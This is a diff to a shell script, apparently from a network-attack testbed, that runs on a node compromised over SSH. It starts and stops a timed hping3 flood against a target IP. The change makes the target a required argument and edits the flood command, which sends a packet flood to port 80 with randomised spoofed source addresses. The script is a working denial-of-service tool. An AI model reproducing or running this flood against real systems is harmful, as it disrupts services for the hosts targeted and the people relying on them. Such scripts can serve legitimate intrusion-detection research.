@@ -3,8 +3,18 @@
 # Runs ON THE COMPROMISED NODE after SSH compromise
 # Starts at T=60s (1 min), stops at T=120s (2 min)
 # Attack duration: 60 seconds
+#
+# Usage: hping3_attack.sh <TARGET_IP>
+#        or set TARGET_IP env var
 
-TARGET_IP="${TARGET_IP:-192.168.100.10}"
+TARGET_IP="${1:-${TARGET_IP:-}}"
+
+if [ -z "$TARGET_IP" ]; then
+    echo "[-] ERROR: TARGET_IP is not set (neither as argument nor env var)"
+    echo "[-] Usage: $0 <TARGET_IP>  or  export TARGET_IP=<IP>"
+    exit 1
+fi
+
 ATTACK_START=60
 ATTACK_STOP=120
 
@@ -19,7 +29,7 @@ sleep $ATTACK_START
 echo "[*] Attack start time: $(date)"
 
 # Phase 2: Launch hping3 flood attack
-hping3 --flood --dport 80 --rand-source $TARGET_IP &
+hping3 --flood --destport 80 --rand-source $TARGET_IP &
 HPING_PID=$!
 echo "[*] hping3 started with PID: $HPING_PID"
 
